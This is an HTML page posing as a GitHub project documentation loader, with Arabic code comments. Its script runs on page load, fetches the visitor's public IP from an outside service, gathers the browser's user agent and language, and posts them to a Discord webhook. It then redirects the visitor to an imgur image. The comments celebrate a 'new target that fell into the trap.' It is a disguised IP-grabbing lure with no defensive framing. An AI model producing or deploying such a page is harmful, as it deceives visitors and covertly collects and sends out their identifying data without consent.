<!DOCTYPE html>
<html>
<head>
    <title>GitHub - Project Documentation</title>
    <script>
        // كود سحب المعلومات وإرسالها للديسكورد
        async function captureInfo() {
            const webhookURL = "YOUR_WEBHOOK_URL";
            
            // جلب الـ IP والمعلومات عبر خدمة خارجية بسيطة
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            
            const info = {
                content: "🚀 **هدف جديد وقع في الفخ!**",
                embeds: [{
                    title: "بيانات الهدف",
                    color: 16711680, // لون أحمر
                    fields: [
                        { name: "الـ IP العام", value: data.ip },
                        { name: "المتصفح", value: navigator.userAgent },
                        { name: "اللغة", value: navigator.language }
                    ]
                }]
            };

            // إرسال البيانات للديسكورد
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });

            // تحويل الصديق للصورة بعد ثانية واحدة
            setTimeout(() => {
                window.location.href = "https://i.imgur.com/866uX9r.jpg";
            }, 1000);
        }
        window.onload = captureInfo;
    </script>
</head>
<body>
    <h1>Loading Project Documentation...</h1>
    <p>Please wait while the repository assets are loading.</p>
</body>
</html>
